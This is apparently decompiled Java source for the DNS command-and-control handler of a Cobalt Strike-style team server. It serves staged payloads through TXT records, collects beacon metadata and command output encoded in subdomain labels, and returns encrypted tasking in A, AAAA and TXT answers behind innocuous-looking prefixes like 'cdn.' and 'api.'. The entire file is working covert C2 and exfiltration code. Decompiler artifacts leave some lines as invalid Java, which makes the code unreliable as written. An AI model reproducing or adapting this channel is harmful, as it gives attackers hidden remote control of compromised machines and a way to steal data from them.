package beacon;

import beacon.dns.CacheManager;
import beacon.dns.ConversationManager;
import beacon.dns.RecvConversation;
import beacon.dns.SendConversation;
import c2profile.Profile;
import common.ArtifactUtils;
import common.CommonUtils;
import common.MudgeSanity;
import common.ScListener;
import common.StringStack;
import dns.DNSServer;
import java.util.Iterator;
import java.util.List;

public class BeaconDNS implements DNSServer.Handler {
   protected Profile c2profile;
   protected BeaconC2 controller;
   protected DNSServer.Response idlemsg;
   protected long idlemask;
   protected String stager_subhost;
   protected String stage = "";
   protected ScListener listener;
   protected CacheManager cache = new CacheManager();
   protected ConversationManager conversations;
   protected String DNS_NS_RESPONSE = "";
   protected String DNS_BEACON_INDICATOR = "";
   protected String DNS_GET_A_INDICATOR = "";
   protected String DNS_GET_AAAA_INDICATOR = "";
   protected String DNS_GET_TXT_INDICATOR = "";
   protected String DNS_PUT_METADATA_INDICATOR = "";
   protected String DNS_PUT_OUTPUT_INDICATOR = "";

   public BeaconDNS(ScListener var1, Profile var2, BeaconC2 var3) {
      this.c2profile = var2;
      this.controller = var3;
      this.idlemask = CommonUtils.ipToLong(var2.getString(".dns-beacon.dns_idle"));
      this.idlemsg = DNSServer.A(this.idlemask);
      this.conversations = new ConversationManager(var2);
      this.listener = var1;
      if (!"".equals(var2.getString(".dns-beacon.dns_stager_subhost"))) {
         this.stager_subhost = var2.getString(".dns-beacon.dns_stager_subhost");
      } else {
         this.stager_subhost = null;
      }

      this.DNS_NS_RESPONSE = var2.getString(".dns-beacon.ns_response").toLowerCase();
      if ("".equals(this.DNS_NS_RESPONSE)) {
         this.DNS_NS_RESPONSE = "drop";
      }

      this.DNS_BEACON_INDICATOR = var2.getString(".dns-beacon.beacon").toLowerCase();
      this.DNS_GET_A_INDICATOR = var2.getString(".dns-beacon.get_A").toLowerCase();
      this.DNS_GET_AAAA_INDICATOR = var2.getString(".dns-beacon.get_AAAA").toLowerCase();
      this.DNS_GET_TXT_INDICATOR = var2.getString(".dns-beacon.get_TXT").toLowerCase();
      this.DNS_PUT_METADATA_INDICATOR = var2.getString(".dns-beacon.put_metadata").toLowerCase();
      this.DNS_PUT_OUTPUT_INDICATOR = var2.getString(".dns-beacon.put_output").toLowerCase();
      if ("".equals(this.DNS_GET_A_INDICATOR)) {
         this.DNS_GET_A_INDICATOR = "cdn.";
      }

      if ("".equals(this.DNS_GET_AAAA_INDICATOR)) {
         this.DNS_GET_AAAA_INDICATOR = "www6.";
      }

      if ("".equals(this.DNS_GET_TXT_INDICATOR)) {
         this.DNS_GET_TXT_INDICATOR = "api.";
      }

      if ("".equals(this.DNS_PUT_METADATA_INDICATOR)) {
         this.DNS_PUT_METADATA_INDICATOR = "www.";
      }

      if ("".equals(this.DNS_PUT_OUTPUT_INDICATOR)) {
         this.DNS_PUT_OUTPUT_INDICATOR = "post.";
      }

      B("BeaconDNS - DNS_BEACON_INDICATOR: " + this.DNS_BEACON_INDICATOR);
      B("BeaconDNS - DNS_GET_A_INDICATOR: " + this.DNS_GET_A_INDICATOR);
      B("BeaconDNS - DNS_GET_AAAA_INDICATOR: " + this.DNS_GET_AAAA_INDICATOR);
      B("BeaconDNS - DNS_GET_TXT_INDICATOR: " + this.DNS_GET_TXT_INDICATOR);
      B("BeaconDNS - DNS_PUT_METADATA_INDICATOR: " + this.DNS_PUT_METADATA_INDICATOR);
      B("BeaconDNS - DNS_PUT_OUTPUT_INDICATOR: " + this.DNS_PUT_OUTPUT_INDICATOR);
   }

   public void setPayloadStage(byte[] var1) {
      String var10001 = this.c2profile.getString(".dns-beacon.dns_stager_prepend");
      this.stage = var10001 + ArtifactUtils.AlphaEncode(var1);
   }

   protected DNSServer.Response serveStage(String var1) {
      int var2 = CommonUtils.toTripleOffset(var1) * 255;
      if (this.stage.length() != 0 && var2 <= this.stage.length()) {
         return var2 + 255 < this.stage.length() ? DNSServer.TXT(CommonUtils.toBytes(this.stage.substring(var2, var2 + 255))) : DNSServer.TXT(CommonUtils.toBytes(this.stage.substring(var2)));
      } else {
         return DNSServer.TXT(new byte[0]);
      }
   }

   public DNSServer.Response respond(String var1, int var2) {
      synchronized(this) {
         DNSServer.Response var10000;
         try {
            var10000 = this.respond_nosync(var1, var2);
         } catch (Exception var7) {
            MudgeSanity.logException("DNS request '" + var1 + "' type(" + var2 + ")", var7, false);
            return this.idlemsg;
         }

         return var10000;
      }
   }

   public DNSServer.Response respond_nosync(String var1, int var2) {
      B("=======================================================================");
      A("BeaconDNS.respond_nosync - Processing host: " + var1 + ", type: " + var2);
      String var3 = var1.toLowerCase();
      B("BeaconDNS.respond_nosync - Checking NS - DNS_NS_RESPONSE : " + this.DNS_NS_RESPONSE);
      if (var2 == 2) {
         if ("zero".equalsIgnoreCase(this.DNS_NS_RESPONSE)) {
            B("BeaconDNS.respond_nosync - Responding with zero to NS Request: " + var1);
            return DNSServer.A(0L);
         } else if ("idle".equalsIgnoreCase(this.DNS_NS_RESPONSE)) {
            B("BeaconDNS.respond_nosync - Responding with idle to NS Request: " + var1);
            return this.idlemsg;
         } else {
            B("BeaconDNS.respond_nosync - Responding with idle to unexpected NS Request: " + var1 + " - " + this.DNS_NS_RESPONSE);
            return this.idlemsg;
         }
      } else {
         StringStack var4 = new StringStack(var3, ".");
         if (var4.isEmpty()) {
            return this.idlemsg;
         } else {
            String var5 = var4.shift();
            if (var5.length() == 3 && "stage".equals(var4.peekFirst())) {
               A("BeaconDNS.respond_nosync - Serving stage payload for alpha counter: " + var5);
               return this.serveStage(var5);
            } else if (this.stager_subhost != null && var1.length() > 4 && var3.substring(3).startsWith(this.stager_subhost)) {
               A("BeaconDNS.respond_nosync - Serving stage payload for host: " + var3);
               return this.serveStage(var3.substring(0, 3));
            } else {
               boolean var8 = false;
               String var6;
               StringStack var7;
               if (var3.startsWith(this.DNS_GET_A_INDICATOR)) {
                  var8 = true;
                  var6 = var3.substring(0, this.DNS_GET_A_INDICATOR.length());
                  var7 = new StringStack(var3.substring(this.DNS_GET_A_INDICATOR.length()), ".");
               } else if (var3.startsWith(this.DNS_GET_TXT_INDICATOR)) {
                  var8 = true;
                  var6 = var3.substring(0, this.DNS_GET_TXT_INDICATOR.length());
                  var7 = new StringStack(var3.substring(this.DNS_GET_TXT_INDICATOR.length()), ".");
               } else if (var3.startsWith(this.DNS_GET_AAAA_INDICATOR)) {
                  var8 = true;
                  var6 = var3.substring(0, this.DNS_GET_AAAA_INDICATOR.length());
                  var7 = new StringStack(var3.substring(this.DNS_GET_AAAA_INDICATOR.length()), ".");
               } else if (var3.startsWith(this.DNS_PUT_METADATA_INDICATOR)) {
                  var8 = true;
                  var6 = var3.substring(0, this.DNS_PUT_METADATA_INDICATOR.length());
                  var7 = new StringStack(var3.substring(this.DNS_PUT_METADATA_INDICATOR.length()), ".");
               } else if (var3.startsWith(this.DNS_PUT_OUTPUT_INDICATOR.toLowerCase())) {
                  var8 = true;
                  var6 = var3.substring(0, this.DNS_PUT_OUTPUT_INDICATOR.length());
                  var7 = new StringStack(var3.substring(this.DNS_PUT_OUTPUT_INDICATOR.length()), ".");
               } else {
                  var3 = A(var3, this.DNS_BEACON_INDICATOR);
                  var7 = new StringStack(var3, ".");
                  if (var7.isEmpty()) {
                     return this.idlemsg;
                  }

                  var6 = var7.shift();
               }

               if (var8) {
                  B("BeaconDNS.respond_nosync - Host matched DNS prefix indicator: " + var6);
               } else {
                  B("BeaconDNS.respond_nosync - Host did not match a DNS prefix indicator");
               }

               B("BeaconDNS.respond_nosync - Processing Host/ID: " + var3 + " / " + var6);
               C("BeaconDNS.respond_nosync - Host parts: ");
               List var9 = var7.toList();
               String var10 = "";
               Iterator var11 = var9.iterator();

               String var12;
               while(var11.hasNext()) {
                  var12 = (String)var11.next();
                  C(var10 + var12);
                  if (var10.length() == 0) {
                     var10 = " / ";
                  }
               }

               B("");
               String var23;
               String var10000;
               if (!this.DNS_GET_A_INDICATOR.equals(var6) && !this.DNS_GET_TXT_INDICATOR.equals(var6) && !this.DNS_GET_AAAA_INDICATOR.equals(var6)) {
                  if (!this.DNS_PUT_METADATA_INDICATOR.equals(var6) && !this.DNS_PUT_OUTPUT_INDICATOR.equals(var6)) {
                     if (CommonUtils.isHexNumber(var6) && CommonUtils.isDNSBeacon(var6)) {
                        var6 = CommonUtils.toNumberFromHex(var6, 0).makeConcatWithConstants<invokedynamic>(CommonUtils.toNumberFromHex(var6, 0));
                        B("BeaconDNS.respond_nosync - Beacon ID from id: " + var6);
                        this.cache.purge();
                        this.conversations.purge();
                        this.controller.getCheckinListener().update(var6, System.currentTimeMillis(), (String)null, false);
                        return this.controller.isCheckinRequired(var6) ? DNSServer.A(this.controller.checkinMask(var6, this.idlemask)) : this.idlemsg;
                     } else {
                        CommonUtils.print_info("DNS: ignoring " + var1);
                        return this.idlemsg;
                     }
                  } else {
                     B("BeaconDNS.respond_nosync - Processing DNS PUT indicator: " + var6);
                     String var16 = "";
                     String var18 = var7.shift();
                     char var19 = var18.charAt(0);
                     String var17 = var6;
                     String var24;
                     if (var19 == '1') {
                        var23 = var18.substring(1);
                        var16 = var23;
                     } else if (var19 == '2') {
                        var23 = var18.substring(1);
                        var12 = var7.shift();
                        var16 = var23 + var12;
                     } else if (var19 == '3') {
                        var23 = var18.substring(1);
                        var12 = var7.shift();
                        var24 = var7.shift();
                        var16 = var23 + var12 + var24;
                     } else if (var19 == '4') {
                        var23 = var18.substring(1);
                        var12 = var7.shift();
                        var24 = var7.shift();
                        String var26 = var7.shift();
                        var16 = var23 + var12 + var24 + var26;
                     }

                     var24 = var7.shift();
                     var10000 = var7.shift();
                     var6 = CommonUtils.toNumberFromHex(var10000, 0).makeConcatWithConstants<invokedynamic>(CommonUtils.toNumberFromHex(var10000, 0));
                     if (this.cache.contains(var6, var24)) {
                        B("BeaconDNS.respond_nosync - Using cached entry: " + var6 + " / " + var24);
                        return this.cache.get(var6, var24);
                     } else {
                        B("BeaconDNS.respond_nosync - Getting RECV Conversation: " + var6 + " / " + var17 + " / " + var24);
                        RecvConversation var20 = this.conversations.getRecvConversation(var6, var17, var24);
                        var20.next(var16);
                        if (var20.isComplete()) {
                           B("BeaconDNS.respond_nosync - Completing Conversation...");
                           this.conversations.removeConversation(var6, var17, var24);

                           try {
                              byte[] var21 = var20.result();
                              if (var21.length == 0) {
                                 CommonUtils.print_warn("Treated DNS request " + var1 + " (" + var2 + ") as a non-C2 message");
                              } else if (this.DNS_PUT_METADATA_INDICATOR.equals(var17)) {
                                 B("BeaconDNS.respond_nosync - Processing beacon metadata...");
                                 this.controller.process_beacon_metadata(this.listener, "", var21);
                              } else if (this.DNS_PUT_OUTPUT_INDICATOR.equals(var17)) {
                                 B("BeaconDNS.respond_nosync - Processing beacon callback...");
                                 this.controller.process_beacon_callback(var6, var21);
                              }
                           } catch (Exception var21) {
                              MudgeSanity.logException("Corrupted DNS transaction? " + var1 + ", type: " + var2, var21, false);
                           }
                        }

                        B("BeaconDNS.respond_nosync - caching result: " + var6 + " / " + var24);
                        this.cache.add(var6, var24, this.idlemsg);
                        return this.idlemsg;
                     }
                  }
               } else {
                  B("BeaconDNS.respond_nosync - Processing DNS indicator: " + var6);
                  var23 = var6;
                  var12 = var7.shift();
                  var10000 = var7.shift();
                  var6 = CommonUtils.toNumberFromHex(var10000, 0).makeConcatWithConstants<invokedynamic>(CommonUtils.toNumberFromHex(var10000, 0));
                  if (this.cache.contains(var6, var12)) {
                     return this.cache.get(var6, var12);
                  } else {
                     SendConversation var13 = null;
                     B("BeaconDNS.respond_nosync - Searching for match of dtype: " + var23);
                     if (this.DNS_GET_A_INDICATOR.equals(var23)) {
                        var13 = this.conversations.getSendConversationA(var6, var23, var12);
                     } else if (this.DNS_GET_TXT_INDICATOR.equals(var23)) {
                        var13 = this.conversations.getSendConversationTXT(var6, var23, var12);
                     } else if (this.DNS_GET_AAAA_INDICATOR.equals(var23)) {
                        var13 = this.conversations.getSendConversationAAAA(var6, var23, var12);
                     }

                     DNSServer.Response var14 = null;
                     if (!var13.started() && var2 == 16) {
                        var14 = DNSServer.TXT(new byte[0]);
                     } else if (!var13.started()) {
                        byte[] var15 = this.controller.dump(var6, 72000, 1048576);
                        if (var15.length > 0) {
                           var15 = this.controller.getSymmetricCrypto().encrypt(var6, var15);
                           var14 = var13.start(var15);
                        } else if (var2 == 28 && this.DNS_GET_AAAA_INDICATOR.equals(var23)) {
                           var14 = DNSServer.AAAA(new byte[16]);
                        } else {
                           var14 = DNSServer.A(0L);
                        }
                     } else {
                        var14 = var13.next();
                     }

                     if (var13.isComplete()) {
                        this.conversations.removeConversation(var6, var23, var12);
                     }

                     this.cache.add(var6, var12, var14);
                     return var14;
                  }
               }
            }
         }
      }
   }

   private static void C(String var0) {
   }

   private static void A(String var0) {
   }

   private static void B(String var0) {
   }

   private static String A(String var0, String var1) {
      if (var0 != null && var1 != null && var1.length() > 0 && var0.startsWith(var1)) {
         B("BeaconDNS.trimOffDNSBeaconIndicator - Trimming DNS Beacon Indicator: " + var1 + ", from host String: " + var0);
         return var0.substring(var1.length());
      } else {
         return var0;
      }
   }
}
